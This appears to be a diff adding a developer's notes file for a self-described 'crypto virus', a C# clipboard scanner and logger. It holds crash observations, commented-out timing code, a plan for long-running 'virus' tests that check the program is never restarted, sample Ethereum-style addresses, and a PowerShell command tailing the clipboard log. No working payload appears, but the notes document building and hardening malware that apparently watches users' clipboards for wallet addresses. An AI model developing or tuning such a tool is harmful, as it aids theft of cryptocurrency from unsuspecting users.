@@ -1,0 +1,63 @@
+OBSERVATIONS:
+
+    When the program was printing to console, after a number of pastes, the program would terminate
+    Now when the console prints were replaced with logging, the issue does not persist anymore
+    Maybe printing to console while simulataneously pasting created some clash condition...
+
+    Possible reason: The buffer (temp storage that data is written to before it's trasmitted) 
+    that console writes to before the content is displayed on the screen
+    is getting full therefore the application crashes.
+
+
+SCRAP C# CODE:
+            // Stopwatch stopWatch = new Stopwatch();
+            // stopWatch.Start();
+            // System_Windows_Forms_dll.ClipboardScanner();
+            // stopWatch.Stop();
+            // TimeSpan ts = stopWatch.Elapsed;
+
+            // string elapsedTime = String.Format("{0:000}", ts.Milliseconds);
+            // Console.WriteLine("RunTime " + elapsedTime);
+
+TESTING:
+
+    Run performance tests for this virus under 2 general cases:
+        PASSIVE (User is lightly copying and pasting but nothing intensive):
+            1HR TIME SPRINT
+
+            3 HR TIME SPRINT
+
+            6 HR TIME SPRINT
+
+            12 HR TIME SPRINT
+
+            24 HR TIME SPRINT
+
+
+        ACTIVE (User session is intensive (running other programs as well as copying and pasting repeatedly)):
+            1HR TIME SPRINT
+
+            3 HR TIME SPRINT
+
+            6 HR TIME SPRINT
+
+            12 HR TIME SPRINT
+
+            24 HR TIME SPRINT
+
+    When reading these logs, we will like to see the number "1" appear only once. Seeing it more than once indicates it has been restarted
+
+
+PERFORMANCE TUNING:
+
+    GET RAM USAGE THROUGHOUT THESE TIME INTERVALS
+
+
+Test Samples
+0xa1c9753e7181313585b07bcd88A64a8eBd808eD7
+0x29D7d1dd5B6f9C864d9db560D72a247c178aE86B
+0xee11cbef798ae00175c053deed76a0478e644c50
+0x21e229f2d307d7F232D608d187e4F4c6F56977a1
+0x693B3f39474F95AE4858A2BAbBFa8624D857902B
+
+Get-Content -Path "C:\Users\Hamerton Mathieu\C# Projects\src\main\c#\notes\crypto virus\ClipboardLogger.log" -Wait
